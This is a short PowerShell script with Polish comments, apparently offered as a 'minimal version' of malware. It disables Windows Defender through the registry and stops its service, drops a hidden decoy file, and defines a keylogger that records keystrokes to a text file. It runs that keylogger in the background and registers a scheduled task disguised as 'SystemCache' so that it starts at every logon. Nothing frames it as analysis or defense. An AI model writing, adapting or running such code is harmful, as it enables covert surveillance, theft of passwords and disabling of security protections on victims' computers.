# Minimalna wersja skryptu
$ErrorActionPreference = "SilentlyContinue"

# 1. Wyłącz Defender
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
Stop-Service WinDefend -Force

# 2. Utwórz plik na dysku E:
$random = -join (48..57 + 65..90 | Get-Random -Count 64 | % { [char]$_ })
Set-Content "E:\SystemCache.dat" $random
attrib +s +h "E:\SystemCache.dat"

# 3. Keylogger (uproszczony)
$kl = @'
$k = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int vKey);
'@ -Name KeyLogger -Namespace Win32 -PassThru

while(1) {
  Start-Sleep -Milliseconds 40
  8..254 | % { if($k::GetAsyncKeyState($_) -eq -32767) { [char]$_ | Add-Content "E:\Keylog.txt" -Encoding UTF8 } }
}
'@

# 4. Uruchom keylogger w tle
Start-Job -ScriptBlock ([scriptblock]::Create($kl))

# 5. Dodaj autostart
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"$kl`""
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "SystemCache" -Action $taskAction -Trigger $taskTrigger -Force
